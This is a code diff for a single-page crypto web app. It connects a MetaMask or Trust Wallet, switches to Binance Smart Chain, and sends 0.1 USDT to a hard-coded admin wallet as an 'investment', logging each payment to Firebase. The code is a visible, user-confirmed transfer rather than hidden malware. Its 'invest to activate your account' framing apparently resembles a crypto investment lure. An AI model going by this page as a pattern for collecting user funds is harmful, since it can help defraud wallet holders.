@@ -44,7 +44,12 @@
 
         .wallet-card { background: rgba(0, 0, 0, 0.4); margin: 1.5rem; padding: 1rem 1.2rem; border-radius: 1.2rem; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(6, 182, 212, 0.2); }
         .wallet-info { display: flex; align-items: center; gap: 10px; font-weight: 500;}
-        .status-led { width: 10px; height: 10px; border-radius: 50%; background: #4b5563; transition: all 0.3s; }
+        
+        /* WALLET ADDRESS HIGHLIGHT */
+        #walletDisplay { font-family: monospace; font-size: 1.1rem; letter-spacing: 0.5px; transition: color 0.3s; }
+        .wallet-connected-text { color: var(--neon-green) !important; font-weight: 700; text-shadow: 0 0 10px rgba(16, 185, 129, 0.3); }
+        
+        .status-led { width: 12px; height: 12px; border-radius: 50%; background: #ef4444; transition: all 0.3s; box-shadow: 0 0 8px #ef4444;}
         .status-led.active { background: var(--success); box-shadow: 0 0 12px var(--success); animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
 
@@ -54,10 +59,11 @@
         .amount-value { font-size: 4.5rem; font-weight: 800; color: var(--neon-cyan); line-height: 1; margin: 0.5rem 0; }
         .amount-value small { font-size: 1.2rem; color: var(--text-dim); }
 
-        .btn { width: 100%; padding: 1rem; border-radius: 1.5rem; font-weight: 700; font-size: 1rem; border: none; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 12px; font-family: 'Outfit', sans-serif; }
+        .btn { width: 100%; padding: 1rem; border-radius: 1.5rem; font-weight: 700; font-size: 1.1rem; border: none; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 12px; font-family: 'Outfit', sans-serif; }
         .btn-primary { background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple)); color: white; box-shadow: 0 6px 20px rgba(6, 182, 212, 0.3); }
         .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 28px rgba(6, 182, 212, 0.5); }
-        .btn-success { background: linear-gradient(135deg, var(--neon-green), #059669); color: white; }
+        .btn-success { background: linear-gradient(135deg, var(--neon-green), #059669); color: white; box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3); }
+        .btn-success:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 28px rgba(16, 185, 129, 0.5); }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .log-area { background: rgba(0, 0, 0, 0.35); margin: 1rem 1.5rem 1.8rem; padding: 0.8rem; border-radius: 1rem; font-size: 0.85rem; color: var(--text-dim); text-align: center; word-wrap: break-word; line-height: 1.4; font-weight: 500;}
@@ -114,21 +120,21 @@
 
         <!-- 1. Selection State -->
         <div class="wallet-options" id="walletOptions">
-            <button class="wallet-btn" onclick="selectWallet('MetaMask')">
+            <button class="wallet-btn" onclick="startWalletConnection('MetaMask')">
                 <span>
                     <img src="https://api.iconify.design/logos:metamask-icon.svg" class="wallet-icon" alt="MetaMask">
                     MetaMask
                 </span>
                 <i class="fas fa-chevron-right" style="color:#4b5563; font-size:0.9rem;"></i>
             </button>
-            <button class="wallet-btn" onclick="selectWallet('Trust Wallet')">
+            <button class="wallet-btn" onclick="startWalletConnection('Trust Wallet')">
                 <span>
                     <img src="https://api.iconify.design/token-branded:trust-wallet.svg" class="wallet-icon" alt="Trust Wallet">
                     Trust Wallet
                 </span>
                 <i class="fas fa-chevron-right" style="color:#4b5563; font-size:0.9rem;"></i>
             </button>
-            <button class="wallet-btn" onclick="selectWallet('Injected')">
+            <button class="wallet-btn" onclick="startWalletConnection('Browser Wallet')">
                 <span>
                     <div class="wallet-icon" style="background:var(--neon-purple); display:flex; justify-content:center; align-items:center;"><i class="fas fa-globe" style="color:#fff;"></i></div>
                     Browser Wallet
@@ -142,7 +148,7 @@
             <div class="live-loader"></div>
             <div class="state-title" id="connectingTitle">Connecting...</div>
             <div class="state-desc">Please approve the connection request in your wallet.</div>
-            <button class="btn" style="background: #2d2e36; margin-top: 20px; padding: 0.8rem;" onclick="resetModal()">Cancel</button>
+            <button class="btn" style="background: #2d2e36; margin-top: 20px; padding: 0.8rem; font-size: 0.9rem;" onclick="resetModal()">Cancel</button>
         </div>
 
         <!-- 3. Success State -->
@@ -151,7 +157,7 @@
                 <i class="fas fa-check"></i>
             </div>
             <div class="state-title">Successfully Connected!</div>
-            <div class="state-desc" style="color: var(--neon-green);">Synchronizing data...</div>
+            <div class="state-desc" style="color: var(--neon-green);">Wallet Address Fetched</div>
         </div>
     </div>
 </div>
@@ -167,9 +173,10 @@
         <div class="wallet-card">
             <div class="wallet-info">
                 <div class="status-led" id="statusLed"></div>
+                <!-- Wallet Address Will Show Here Lazmi -->
                 <span id="walletDisplay">Not Connected</span>
             </div>
-            <i class="fas fa-wallet" style="color: var(--neon-cyan);"></i>
+            <i class="fas fa-wallet" style="color: var(--neon-cyan); font-size: 1.2rem;"></i>
         </div>
 
         <div class="investment-box">
@@ -183,7 +190,7 @@
                 <i class="fas fa-plug"></i> Connect Wallet
             </button>
 
-            <button class="btn btn-primary" id="investNowBtn" style="display: none;">
+            <button class="btn btn-success" id="investNowBtn" style="display: none;">
                 <i class="fas fa-rocket"></i> Invest 0.1 USDT
                 <i class="fas fa-spinner spinner-icon" id="investLoader" style="display: none;"></i>
             </button>
@@ -222,13 +229,13 @@
             <div class="wallet-card" style="margin: 0 0 1rem 0;">
                 <div class="wallet-info">
                     <i class="fas fa-user-astronaut"></i>
-                    <span id="dashWalletAddr" style="font-family: monospace;"></span>
+                    <span id="dashWalletAddr" class="wallet-connected-text" style="font-size: 1.1rem;"></span>
                 </div>
                 <i class="fas fa-shield-alt" style="color: var(--success);"></i>
             </div>
 
-            <button class="btn btn-success" id="refreshDashboardBtn">
-                <i class="fas fa-sync-alt"></i> Refresh Balance Status
+            <button class="btn btn-primary" id="refreshDashboardBtn" style="background: #1e293b; border: 1px solid #334155;">
+                <i class="fas fa-sync-alt"></i> Refresh Balance
             </button>
         </div>
 
@@ -277,7 +284,10 @@
     const investBtn = document.getElementById('investNowBtn');
     const investLoader = document.getElementById('investLoader');
     const logMsgDiv = document.getElementById('logMessage');
+    const walletDisplaySpan = document.getElementById('walletDisplay');
+    const statusLed = document.getElementById('statusLed');
     
+    // Modal Elements
     const modalOverlay = document.getElementById('walletModalOverlay');
     const walletOptions = document.getElementById('walletOptions');
     const connectingState = document.getElementById('connectingState');
@@ -294,12 +304,7 @@
         }
     }
 
-    // Check if device is Mobile
-    function isMobileDevice() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
-
-    // Modal Control Functions
+    // Modal Controls
     function openModal() {
         resetModal();
         modalOverlay.classList.add('active');
@@ -318,61 +323,75 @@
 
     connectBtn.addEventListener('click', openModal);
     document.getElementById('closeModalBtn').addEventListener('click', closeModal);
-    
-    // Prevent closing when clicking inside the modal
-    modalOverlay.addEventListener('click', (e) => {
-        if(e.target === modalOverlay) closeModal();
-    });
+    modalOverlay.addEventListener('click', (e) => { if(e.target === modalOverlay) closeModal(); });
+
+    // Format Wallet Address
+    function formatAddress(addr) {
+        return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
+    }
 
     // ==========================================
-    // WALLET SELECTION & CONNECTION LOGIC
+    // STEP 1: WALLET CONNECTION & GET ADDRESS
     // ==========================================
-    async function selectWallet(walletName) {
+    async function startWalletConnection(walletName) {
         walletOptions.style.display = 'none';
         connectingState.style.display = 'flex';
         connectingTitle.innerText = `Connecting to ${walletName}...`;
 
         try {
-            // Check if standard injected wallet exists (window.ethereum)
+            // Check if wallet extension/browser is injected
             if (typeof window.ethereum === 'undefined') {
-                if (isMobileDevice()) {
-                    // Mobile Deep Linking (No Error Crash)
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (isMobile) {
                     const currentUrl = window.location.host + window.location.pathname;
                     if (walletName === 'MetaMask') {
                         window.location.href = `https://metamask.app.link/dapp/${currentUrl}`;
                     } else if (walletName === 'Trust Wallet') {
                         window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${currentUrl}`;
                     } else {
-                        throw new Error("Please open this page inside a DApp Browser (Trust Wallet / MetaMask).");
+                        throw new Error("Please open this in Trust Wallet or MetaMask browser.");
                     }
                     return;
                 } else {
-                    // Desktop Error
-                    throw new Error("No crypto wallet found. Please install MetaMask Extension.");
+                    throw new Error("No Crypto Wallet found! Please install MetaMask extension.");
                 }
             }
 
-            // Request Connection
+            // Request Account Permission from Wallet
             const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            if (!accounts || accounts.length === 0) throw new Error("Connection request cancelled.");
+            
+            if (!accounts || accounts.length === 0) {
+                throw new Error("Wallet connection rejected.");
+            }
 
-            // Show Success UI in Modal
+            // SUCCESS! We got the address
+            userWalletAddress = accounts[0];
+
+            // Show Success Animation in Modal
             connectingState.style.display = 'none';
             successState.style.display = 'flex';
 
-            // Wait 1.2s then setup the blockchain details behind the scenes
+            // Update MAIN UI with Address LAZMI SHOW
+            walletDisplaySpan.innerText = formatAddress(userWalletAddress);
+            walletDisplaySpan.classList.add('wallet-connected-text');
+            statusLed.classList.add('active'); // Turn LED Green
+
+            // Switch Buttons
+            connectBtn.style.display = "none";
+            investBtn.style.display = "flex";
+
+            // Delay closing modal so user sees "Success"
             setTimeout(() => {
                 closeModal();
-                setupBlockchainEnvironment();
-            }, 1200);
+                // Proceed to setup Blockchain settings (Network, Contract, Check Firebase)
+                initializeBlockchainData();
+            }, 1500);
 
         } catch (error) {
-            console.error("Wallet Connection Error:", error);
-            
-            // Clean Error Messages
+            console.error("Wallet Error:", error);
             let errMsg = "Connection failed. Please try again.";
-            if (error.code === 4001) errMsg = "Request rejected. You declined the connection.";
-            if (error.code === -32002) errMsg = "Request already pending. Please open your wallet.";
+            if (error.code === 4001) errMsg = "Request rejected in your wallet.";
+            if (error.code === -32002) errMsg = "Connection request is already pending. Please open your wallet app.";
             if (error.message) errMsg = error.message;
 
             setStatusMessage(errMsg, true);
@@ -382,40 +401,32 @@
     }
 
     // ==========================================
-    // BLOCKCHAIN SETUP & VALIDATION
+    // STEP 2: SETUP ETHERS, NETWORK & CONTRACT
     // ==========================================
-    async function setupBlockchainEnvironment() {
+    async function initializeBlockchainData() {
         try {
-            setStatusMessage("🔌 Verifying Network (Binance Smart Chain)...");
-            connectBtn.disabled = true;
+            setStatusMessage("🔌 Verifying Binance Smart Chain Network...");
+            investBtn.disabled = true;
 
-            // 1. Force BSC Network
+            // Check & Switch Network to BSC
             const isBSC = await ensureBSCNetwork();
             if (!isBSC) {
-                setStatusMessage("❌ Network Error: Switch to Binance Smart Chain and try again.", true);
-                connectBtn.disabled = false;
+                setStatusMessage("❌ Please switch your wallet to Binance Smart Chain.", true);
+                investBtn.disabled = false;
                 return;
             }
 
-            // 2. Setup Ethers.js
+            // Setup Ethers.js
             web3Provider = new ethers.BrowserProvider(window.ethereum);
             web3Signer = await web3Provider.getSigner();
-            userWalletAddress = await web3Signer.getAddress();
             
-            // 3. Setup Contract
+            // Setup USDT Contract
             usdtTokenContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, web3Signer);
             tokenDecimals = Number(await usdtTokenContract.decimals()); 
             
-            // 4. Update UI to Connected State
-            document.getElementById('walletDisplay').innerHTML = `<i class="fas fa-check-circle"></i> ${userWalletAddress.slice(0,6)}...${userWalletAddress.slice(-4)}`;
-            document.getElementById('statusLed').classList.add('active');
+            setStatusMessage(`✅ Connected securely. Checking past investments...`);
             
-            connectBtn.style.display = "none";
-            investBtn.style.display = "flex";
-            
-            setStatusMessage(`✅ Connected: Checking your account status...`);
-            
-            // 5. Check Firebase for past investment
+            // Check Firebase for old investments
             if (db) {
                 const snapshot = await db.ref(`invested_users/${userWalletAddress.toLowerCase()}`).once('value');
                 if (snapshot.exists() && snapshot.val().invested === true) {
@@ -425,18 +436,17 @@
                 }
             }
             
-            setStatusMessage("💰 Wallet Connected! Click 'Invest 0.1 USDT' to activate your account.");
+            setStatusMessage("💰 Ready! Click 'Invest 0.1 USDT' to complete transaction.");
+            investBtn.disabled = false;
             
         } catch (error) {
-            console.error("Setup error:", error);
-            setStatusMessage("❌ Setup failed. Please refresh the page.", true);
-            connectBtn.disabled = false;
+            console.error("Blockchain Init Error:", error);
+            setStatusMessage("❌ Network setup failed. Please refresh.", true);
+            investBtn.disabled = false;
         }
     }
 
-    // ==========================================
-    // NETWORK SWITCHING (ERROR-PROOF)
-    // ==========================================
+    // Network Switch Logic
     async function ensureBSCNetwork() {
         try {
             const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -447,9 +457,8 @@
                 });
             }
             return true;
-        } catch (switchErr) {
-            // Error code 4902 means the chain hasn't been added to the wallet
-            if (switchErr.code === 4902) {
+        } catch (error) {
+            if (error.code === 4902) {
                 try {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
@@ -463,23 +472,21 @@
                     });
                     return true;
                 } catch (addError) {
-                    console.error("Failed to add BSC Network", addError);
                     return false;
                 }
             }
-            console.error("Failed to switch network", switchErr);
             return false;
         }
     }
 
     // ==========================================
-    // SAFE TRANSACTION EXECUTION
+    // STEP 3: EXECUTE TRANSACTION
     // ==========================================
     investBtn.addEventListener('click', async () => {
         try {
             investBtn.disabled = true;
             investLoader.style.display = "inline-block";
-            setStatusMessage("⏳ Verifying your wallet balance...");
+            setStatusMessage("⏳ Verifying your USDT balance...");
             
             const validAdminAddr = ethers.getAddress(ADMIN_WALLET);
             const investmentAmountWei = ethers.parseUnits("0.1", tokenDecimals);
@@ -488,46 +495,46 @@
             const userUsdtBalance = await usdtTokenContract.balanceOf(userWalletAddress);
             if (userUsdtBalance < investmentAmountWei) {
                 const balFormatted = Number(ethers.formatUnits(userUsdtBalance, tokenDecimals)).toFixed(4);
-                throw new Error(`Insufficient USDT! You have ${balFormatted} USDT.`);
+                throw new Error(`Insufficient Balance! You have ${balFormatted} USDT.`);
             }
 
-            // 2. Gas Estimate (Prevents failed TXs if no BNB)
-            setStatusMessage("🔄 Please CONFIRM the transaction in your wallet popup...");
+            // 2. Network Gas Fee Check
+            setStatusMessage("🔄 Please CONFIRM the transaction in your Wallet...");
             try {
                 await usdtTokenContract.transfer.estimateGas(validAdminAddr, investmentAmountWei);
             } catch (gasError) {
-                throw new Error("You need a small amount of BNB (Smart Chain) to pay the network gas fee.");
+                throw new Error("Transaction will fail! You need a small amount of BNB for gas fees.");
             }
 
-            // 3. Send Transaction
+            // 3. Process Transaction
             const transferTx = await usdtTokenContract.transfer(validAdminAddr, investmentAmountWei);
-            setStatusMessage(`⏳ Processing TX on Blockchain... Please wait.`);
+            setStatusMessage(`⏳ Processing TX on Blockchain... Hash: ${transferTx.hash.slice(0, 10)}...`);
             
-            // 4. Wait for confirmation
+            // 4. Wait for receipt
             const receipt = await transferTx.wait();
             
             if (receipt.status === 1) {
-                setStatusMessage(`✅ SUCCESS! Investment Confirmed.`);
+                setStatusMessage(`✅ SUCCESS! Saving details...`);
                 
-                // 5. Save to Firebase securely
+                // 5. Save to Firebase
                 if (db) {
                     const safeKey = userWalletAddress.toLowerCase();
                     const timestamp = Date.now();
                     await db.ref().update({
                         [`invested_users/${safeKey}`]: { wallet: userWalletAddress, invested: true, amount: "0.1", timestamp, txHash: receipt.hash },
                         [`user_investments/${receipt.hash}`]: { from: userWalletAddress, to: validAdminAddr, amount: "0.1", timestamp, status: "COMPLETED" }
-                    }).catch(e => console.error("Firebase save error:", e));
+                    });
                 }
 
                 showUserDashboard();
             } else {
-                throw new Error("Transaction was reversed or failed on the blockchain.");
+                throw new Error("Blockchain Transaction Failed.");
             }
             
         } catch (error) {
-            console.error("Investment Error:", error);
+            console.error("TX Error:", error);
             let errMsg = "Transaction Failed.";
-            if (error.code === 4001 || error.message.includes("user rejected")) errMsg = "Transaction cancelled by you.";
+            if (error.code === 4001 || error.message.includes("user rejected")) errMsg = "Transaction cancelled by you in your wallet.";
             else if (error.message) errMsg = error.message;
 
             setStatusMessage(`❌ Error: ${errMsg}`, true);
@@ -537,12 +544,12 @@
     });
 
     // ==========================================
-    // DASHBOARD LOGIC
+    // STEP 4: DASHBOARD
     // ==========================================
     async function showUserDashboard() {
         document.getElementById('initialView').style.display = "none";
         document.getElementById('dashboardView').style.display = "block";
-        document.getElementById('dashWalletAddr').innerText = `${userWalletAddress.slice(0,6)}...${userWalletAddress.slice(-4)}`;
+        document.getElementById('dashWalletAddr').innerText = formatAddress(userWalletAddress);
         await fetchUserDashboardStats();
     }
     
@@ -553,7 +560,7 @@
             const formattedBalance = ethers.formatUnits(balanceWei, tokenDecimals);
             document.getElementById('dashBalance').innerText = Number(formattedBalance).toFixed(4);
         } catch (error) {
-            console.error("Dashboard Stats Error:", error);
+            console.error("Stats Error:", error);
         }
     }
 
@@ -566,7 +573,7 @@
         setTimeout(() => { btn.disabled = false; }, 2000);
     });
 
-    // Auto-reload on account or network change
+    // Auto Refresh on Wallet account change
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
             if (accounts.length > 0) window.location.reload(); 
